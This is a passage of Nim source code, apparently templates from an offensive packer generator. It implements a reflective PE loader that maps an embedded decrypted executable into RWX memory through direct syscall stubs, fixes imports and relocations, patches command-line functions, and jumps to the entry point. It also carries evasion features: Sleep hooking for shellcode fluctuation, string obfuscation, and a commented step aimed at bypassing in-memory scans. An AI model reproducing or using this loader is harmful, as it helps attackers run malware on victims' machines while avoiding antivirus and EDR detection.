    var idh: ptr IMAGE_DOS_HEADER = cast[ptr IMAGE_DOS_HEADER](pe_buffer)
    if idh.e_magic != IMAGE_DOS_SIGNATURE:
      return nil
    let kMaxOffset: LONG = 1024
    var pe_offset: LONG = idh.e_lfanew
    if pe_offset > kMaxOffset:
      return nil
    var inh: ptr IMAGE_NT_HEADERS32 = cast[ptr IMAGE_NT_HEADERS32]((
        cast[ptr BYTE](pe_buffer) + pe_offset))
    if inh.Signature != IMAGE_NT_SIGNATURE:
      return nil
    return cast[ptr BYTE](inh)

proc getPeDir*(pe_buffer: PVOID; dir_id: csize_t): ptr IMAGE_DATA_DIRECTORY =
    if dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES:
      return nil
    var nt_headers: ptr BYTE = getNtHdrs(cast[ptr BYTE](pe_buffer))
    if nt_headers == nil:
      return nil
    var peDir: ptr IMAGE_DATA_DIRECTORY = nil
    var nt_header: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](nt_headers)
    peDir = addr((nt_header.OptionalHeader.DataDirectory[dir_id]))
    if peDir.VirtualAddress == 0:
      return nil
    return peDir

type
    BASE_RELOCATION_ENTRY* {.bycopy.} = object
      Offset* {.bitsize: 12.}: WORD
      Type* {.bitsize: 4.}: WORD


const
    RELOC_32BIT_FIELD* = 3

proc applyReloc*(newBase: ULONGLONG; oldBase: ULONGLONG; modulePtr: PVOID;moduleSize: SIZE_T): bool =
    var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(modulePtr,
        IMAGE_DIRECTORY_ENTRY_BASERELOC)
    if relocDir == nil:
      return false
    var maxSize: csize_t = csize_t(relocDir.Size)
    var relocAddr: csize_t = csize_t(relocDir.VirtualAddress)
    var reloc: ptr IMAGE_BASE_RELOCATION = nil
    var parsedSize: csize_t = 0
    while parsedSize < maxSize:
      reloc = cast[ptr IMAGE_BASE_RELOCATION]((
          size_t(relocAddr) + size_t(parsedSize) + cast[size_t](modulePtr)))
      if reloc.VirtualAddress == 0 or reloc.SizeOfBlock == 0:
        break
      var entriesNum: csize_t = csize_t((reloc.SizeOfBlock - sizeof((IMAGE_BASE_RELOCATION)))) div
          csize_t(sizeof((BASE_RELOCATION_ENTRY)))
      var page: csize_t = csize_t(reloc.VirtualAddress)
      var entry: ptr BASE_RELOCATION_ENTRY = cast[ptr BASE_RELOCATION_ENTRY]((
          cast[size_t](reloc) + sizeof((IMAGE_BASE_RELOCATION))))
      var i: csize_t = 0
      while i < entriesNum:
        var offset: csize_t = entry.Offset
        var entryType: csize_t = entry.Type
        var reloc_field: csize_t = page + offset
        if entry == nil or entryType == 0:
          break
        if entryType != RELOC_32BIT_FIELD:
          return false
        if size_t(reloc_field) >= moduleSize:
          return false
        var relocateAddr: ptr csize_t = cast[ptr csize_t]((
            cast[size_t](modulePtr) + size_t(reloc_field)))
        (relocateAddr[]) = ((relocateAddr[]) - csize_t(oldBase) + csize_t(newBase))
        entry = cast[ptr BASE_RELOCATION_ENTRY]((
            cast[size_t](entry) + sizeof((BASE_RELOCATION_ENTRY))))
        inc(i)
      inc(parsedSize, reloc.SizeOfBlock)
    return parsedSize != 0

proc OriginalFirstThunk*(self: ptr IMAGE_IMPORT_DESCRIPTOR): DWORD {.inline.} = self.union1.OriginalFirstThunk

proc fixIAT*(modulePtr: PVOID): bool =
    var importsDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(modulePtr,
        IMAGE_DIRECTORY_ENTRY_IMPORT)
    if importsDir == nil:
      return false
    var maxSize: csize_t = cast[csize_t](importsDir.Size)
    var impAddr: csize_t = cast[csize_t](importsDir.VirtualAddress)
    var lib_desc: ptr IMAGE_IMPORT_DESCRIPTOR
    var parsedSize: csize_t = 0
    while parsedSize < maxSize:
      lib_desc = cast[ptr IMAGE_IMPORT_DESCRIPTOR]((
          impAddr + parsedSize + cast[uint64](modulePtr)))
      
      if (lib_desc.OriginalFirstThunk == 0) and (lib_desc.FirstThunk == 0):
        break
      var libname: LPSTR = cast[LPSTR](cast[ULONGLONG](modulePtr) + lib_desc.Name)
      var call_via: csize_t = cast[csize_t](lib_desc.FirstThunk)
      var thunk_addr: csize_t = cast[csize_t](lib_desc.OriginalFirstThunk)
      if thunk_addr == 0:
        thunk_addr = csize_t(lib_desc.FirstThunk)
      var offsetField: csize_t = 0
      var offsetThunk: csize_t = 0

      var hmodule: HMODULE = MyLoadLibraryA(libname)
      when defined(args):
        var commandStr: string
        var exeArgsPassed = false
        if len(arguments) > 0: 
            commandStr = " " & arguments # in case commands are passed we have to prepend at least a space so that argv[1] is the first part of arguments
            exeArgsPassed = true
        if exeArgsPassed:
            # patch _wcmdln and _acmdln if they are present in the import to make arguments working for some C++ binaries
            var wcmdlenaddr = MyGetProcAddress(hmodule,"_wcmdln") 
            if wcmdlenaddr != NULL:
                echo obf("Found _wcmdln -> patching with arguments")
                var newCmd = newWideCString(commandStr) # we have to prepend 
                patchMemory(wcmdlenaddr, cast[array[sizeOf(pointer), byte]](newCmd))
            var acmdlenaddr = MyGetProcAddress(hmodule,"_acmdln") 
            if acmdlenaddr != NULL:
                echo obf("Found _acmdln -> patching with arguments")
                var newCmd = &(commandStr)
                patchMemory(acmdlenaddr, cast[array[sizeOf(pointer), byte]](newCmd))
                
      while true:
        var fieldThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
            cast[csize_t](modulePtr) + offsetField + call_via))
        var orginThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
            cast[csize_t](modulePtr) + offsetThunk + thunk_addr))
        var boolvar: bool
        if ((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG32) != 0):
          boolvar = true
        elif((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
          boolvar = true
        if (boolvar):
          when defined(DInvoke):
              var libaddr: size_t = cast[size_t](MyGetProcAddress(MyLoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
          else:
              var libaddr: size_t = cast[size_t](GetProcAddress(LoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
          fieldThunk.u1.Function = ULONGLONG(libaddr)
        if fieldThunk.u1.Function == 0:
          break
        if fieldThunk.u1.Function == orginThunk.u1.Function:
          var nameData: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](orginThunk.u1.AddressOfData)
          var byname: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](cast[ULONGLONG](modulePtr) + cast[DWORD](nameData))
          
    
          var func_name: LPCSTR = cast[LPCSTR](addr byname.Name)
          
          let asd = byname.Name

          when defined(DInvoke):
              var hmodule: HMODULE = MyLoadLibraryA(libname)
              var libaddr: csize_t = cast[csize_t](MyGetProcAddress(hmodule,func_name))
          else:
              var hmodule: HMODULE = LoadLibraryA(libname)
              var libaddr: csize_t = cast[csize_t](GetProcAddress(hmodule,func_name))
          
    
          fieldThunk.u1.Function = ULONGLONG(libaddr)

          when defined(args):
            # patch common Win32 functions to get the command line
            if exeArgsPassed and "GetCommandLineW" == $$func_name:
                echo obf("[>] Patching function to pass exeArgs: "), func_name
                patchArgFunctionMemory(cast[pointer](libaddr), cast[pointer](newWideCString(commandStr)))
            if exeArgsPassed and $$"GetCommandLineA" == func_name:
                echo obf("[>] Patching function to pass exeArgs: "), func_name
                patchArgFunctionMemory(cast[pointer](libaddr), cast[pointer](&commandStr))
    
        inc(offsetField, sizeof((IMAGE_THUNK_DATA)))
        inc(offsetThunk, sizeof((IMAGE_THUNK_DATA)))
      inc(parsedSize, sizeof((IMAGE_IMPORT_DESCRIPTOR)))
    return true

proc pwndem(): void =

    var peToLoadPtr: ptr = dectext[0].addr

    var pImageBase: ptr BYTE = nil
    var preferAddr: LPVOID = nil
    var ntHeader: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](getNtHdrs(peToLoadPtr))
    if (ntHeader == nil):
      echo obf("[+] File isn't a PE file.")
      quit()

    var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(peToLoadPtr,IMAGE_DIRECTORY_ENTRY_BASERELOC)
    preferAddr = cast[LPVOID](ntHeader.OptionalHeader.ImageBase)
    
    echo $ntHeader.OptionalHeader.SizeOfImage

    when defined(Fluctuate):
        g_fluctuationData.shellcodeAddr = dectext[0].addr
        g_fluctuationData.shellcodeSize = size_t(ntHeader.OptionalHeader.SizeOfImage)
        # Will change the hardcoded key later on
        when defined(amd64):
            g_fluctuationData.encodeKey = 0x1337DE4D
        when defined(i386):
            g_fluctuationData.encodeKey = 0x1337
        g_fluctuationData.currentlyEncrypted = false
        g_fluctuationData.protect = PAGE_READWRITE
        g_fluctuate = FluctuateToRW
        if (hookSleep()):
            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
        else:
            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
    
    var allocsize: SIZE_T = cast[SIZE_T](ntHeader.OptionalHeader.SizeOfImage)
    var ds: LPVOID
    var status: NTSTATUS = NtAllocateVirtualMemory(pHandle2, &preferAddr, 0, &allocsize,MEM_COMMIT or MEM_RESERVE,PAGE_EXECUTE_READWRITE)
    
    echo obf("NtAllocateVirtualMemory:")
    echo status
    
    
    if (preferAddr == nil and relocDir == nil):
      echo obf("[-] Allocate Image Base At Failure.\n")
      quit()
    
    ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](preferAddr)
    
    var bytesWritten: SIZE_T
    status = NtWriteVirtualMemory(pHandle2,preferAddr,peToLoadPtr,ntHeader.OptionalHeader.SizeOfHeaders,addr bytesWritten)
    
    echo obf("NtWriteVirtualMemory:")
    echo status
    
    
    var SectionHeaderArr: ptr IMAGE_SECTION_HEADER = cast[ptr IMAGE_SECTION_HEADER]((cast[size_t](ntHeader) + sizeof((IMAGE_NT_HEADERS))))
    var i: int = 0
    while i < cast[int](ntHeader.FileHeader.NumberOfSections):
      var dest: LPVOID = (preferAddr + SectionHeaderArr[i].VirtualAddress)
      var source: LPVOID = (peToLoadPtr + SectionHeaderArr[i].PointerToRawData)
      status = NtWriteVirtualMemory(pHandle2,dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData),addr bytesWritten)
      echo obf("NtWriteVirtualMemory for section: "), toString(SectionHeaderArr[i].Name)
      echo status
      inc(i)
    
    var goodrun = fixIAT(preferAddr)
    
    if preferAddr != preferAddr:
      discard applyReloc(cast[ULONGLONG](preferAddr), cast[ULONGLONG](preferAddr), preferAddr,ntHeader.OptionalHeader.SizeOfImage)
    var retAddr: HANDLE = cast[HANDLE](preferAddr) + cast[HANDLE](ntHeader.OptionalHeader.AddressOfEntryPoint)


 
    let f = cast[proc(){.nimcall.}](retAddr)
    f()

#[
    var 
      protectAddress = preferAddr
      op: ULONG
      t: ULONG
    # Setting the protection to PAGE_NOACCESS afterwards could bypass in memory scans if the execution was completed fast enough.
    status =  NtProtectVirtualMemory(pHandle2,addr protectAddress,addr allocsize,0x01,addr op)
    if (status != 0):
        echo obf("NtProtectVirtualMemory failed")
        echo status
        echo GetLastError()
    else:
        echo obf("[*] OldProtect set back")

]#


when isMainModule:
     GetStubs()
     pwndem()

"""


let ProtectWriteAllocSyscalls * = """

proc GetStubs(): void =

 
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
    
    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
    
    var oldProtection: DWORD = 0
    
    # Define NtProtectVirtualMemory
    NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
    when defined(DInvoke):
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    # define NtWriteVirtualMemory
    NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
    when defined(DInvoke):
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    
    # define NtAllocateVirtualMemory
    NtAllocateVirtualMemory = cast[myNtAllocateVirtM](cast[LPVOID](syscallStub_NtAlloc))
    when defined(DInvoke):
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    
    
    success = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
    success = GetSyscallStub(obf("NtAllocateVirtualMemory"), cast[LPVOID](syscallStub_NtAlloc))

"""
